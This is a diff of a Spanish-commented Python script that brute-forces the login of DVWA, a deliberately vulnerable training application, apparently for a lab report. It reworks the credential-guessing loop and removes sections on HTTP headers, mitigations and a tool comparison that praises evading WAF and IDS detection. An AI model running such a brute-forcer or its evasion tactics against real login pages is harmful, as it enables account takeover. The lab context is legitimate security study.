@@ -105,105 +105,30 @@ class DVWABruteForcer:
         print(f"[INFO] URL objetivo: {self.login_url}")
         print(f"[INFO] Delay entre intentos: {delay}s")
         print("-" * 60)
-        
+
         for username in usernames:
             for password in passwords:
                 current_attempt += 1
-                
-                # Barra de progreso simple
+
                 progress = (current_attempt / total_attempts) * 100
-                sys.stdout.write(f"\r[{current_attempt:04d}/{total_attempts:04d}] Probando {username}:{password}... {' ' * 20}")
+                sys.stdout.write(
+                    f"\r[{current_attempt:04d}/{total_attempts:04d}] Probando {username}:{password}... "
+                    + " " * 20
+                )
                 sys.stdout.flush()
 
                 success, _ = self.attempt_login(username, password)
-                
+
                 if success:
-                    sys.stdout.write(f"\r{' ' * 80}\r") # Limpiar línea
+                    sys.stdout.write("\r" + " " * 80 + "\r")
                     print(f"[SUCCESS] ✓ Credenciales válidas encontradas: {username}:{password}")
                     valid_credentials.append((username, password))
-                
+
                 if delay > 0:
                     time.sleep(delay)
-        
+
         print("\n" + "-" * 60)
         return valid_credentials
-
-def print_http_headers_explanation():
-    """
-    Imprime explicación sobre las cabeceras HTTP utilizadas en el ataque.
-    """
-    print("\n" + "="*80)
-    print("EXPLICACIÓN DE CABECERAS HTTP UTILIZADAS EN EL ATAQUE DE FUERZA BRUTA")
-    print("="*80)
-    
-    headers_info = {
-        "User-Agent": {
-            "proposito": "Identifica el navegador/cliente que realiza la petición.",
-            "importancia": "CRÍTICA. Simula un navegador real para evitar una detección trivial de bots o scripts."
-        },
-        "Accept": {
-            "proposito": "Le dice al servidor qué tipos de contenido (MIME types) puede entender el cliente.",
-            "importancia": "Alta. Hace que la petición parezca más legítima, imitando el comportamiento de un navegador estándar."
-        },
-        "Connection": {
-            "proposito": "Controla si la conexión de red se mantiene abierta después de que finalice la transacción actual.",
-            "importancia": "Media. Usar 'keep-alive' mejora el rendimiento del ataque al reutilizar la misma conexión TCP para múltiples peticiones."
-        },
-        "Cookie": {
-            "proposito": "Contiene datos de sesión almacenados. En DVWA, gestiona el ID de sesión (PHPSESSID) y el nivel de seguridad.",
-            "importancia": "ABSOLUTAMENTE CRÍTICA. Sin una cookie de sesión válida, cada petición sería anónima y el ataque fallaría, ya que el servidor no podría mantener el estado de autenticación."
-        }
-    }
-    
-    for header, info in headers_info.items():
-        print(f"\n{header}:")
-        print(f"  - Propósito: {info['proposito']}")
-        print(f"  - Importancia en este ataque: {info['importancia']}")
-
-def print_mitigation_methods():
-    """
-    Imprime información sobre métodos de mitigación de ataques de fuerza bruta.
-    """
-    print("\n" + "="*80)
-    print("4 MÉTODOS COMUNES PARA PREVENIR/MITIGAR ATAQUES DE FUERZA BRUTA")
-    print("="*80)
-    
-    # ... (El contenido de esta función se puede copiar del borrador original si se desea) ...
-    # O se puede dejar una versión resumida como la siguiente:
-    
-    methods = {
-        "1. Rate Limiting y Bloqueo de Cuentas": "Limita el número de intentos de login desde una IP en un tiempo determinado y bloquea la cuenta tras varios fallos.",
-        "2. CAPTCHA": "Presenta un desafío que es fácil para humanos pero difícil para bots, usualmente tras detectar varios intentos fallidos.",
-        "3. Autenticación de Múltiples Factores (MFA)": "Requiere una segunda forma de verificación además de la contraseña (ej. un código del teléfono), haciendo que la contraseña por sí sola sea inútil.",
-        "4. Monitoreo y Análisis de Comportamiento": "Utiliza sistemas (como un WAF) para detectar patrones de ataque anómalos (ej. intentos desde múltiples IPs, horas inusuales) y bloquearlos proactivamente."
-    }
-    
-    for method, description in methods.items():
-        print(f"\n{method}:\n  - {description}\n")
-
-def print_performance_comparison():
-    """
-    Imprime una tabla y análisis comparativo de rendimiento.
-    """
-    print("\n" + "="*80)
-    print("COMPARACIÓN DE RENDIMIENTO DE HERRAMIENTAS")
-    print("="*80)
-    
-    print("""
-| Herramienta      | Velocidad | Detección (Sigilo) | Configuración | Flexibilidad |
-|------------------|-----------|--------------------|---------------|--------------|
-| Script Python    | Media     | Muy Alta           | Alta          | Muy Alta     |
-| Hydra            | Muy Alta  | Baja               | Media         | Media        |
-| Burp Suite       | Alta      | Alta               | Baja          | Alta         |
-| cURL (en script) | Baja      | Muy Alta           | Manual        | Baja         |
-    """)
-    
-    print("""
-Análisis Comparativo:
-  - Velocidad: Hydra es el rey de la velocidad gracias a su motor multihilo optimizado en C. Burp Suite también es muy rápido. El script de Python es más lento por defecto debido al intérprete, pero puede mejorarse con librerías asíncronas.
-  - Detección (Sigilo): El script de Python es el más sigiloso. Permite un control total sobre delays, proxies rotativos y la aleatorización de User-Agents, haciendo el ataque casi indistinguible del tráfico humano. cURL es similarmente sigiloso pero a costa de ser manual. Hydra, por su alta velocidad y patrones de petición predecibles, es el más fácil de detectar por un WAF o un IDS.
-  - Flexibilidad: Python gana por goleada. Puede manejar cualquier lógica compleja: CSRF tokens que cambian en cada petición, desafíos JavaScript, o flujos de autenticación de varios pasos. Burp Suite es también muy flexible con sus macros. Hydra está más limitado a escenarios de login estándar.
-    """)
 
 def main():
     """
@@ -212,12 +137,6 @@ def main():
     print("="*80)
     print("SCRIPT DE FUERZA BRUTA - DVWA")
     print("="*80)
-    
-    # Explicaciones teóricas primero, como lo requiere el informe
-    print_http_headers_explanation()
-    print_mitigation_methods()
-    print_performance_comparison()
-    
     print("\n" + "="*80)
     print("EJECUCIÓN DEL ATAQUE DE FUERZA BRUTA")
     print("="*80)
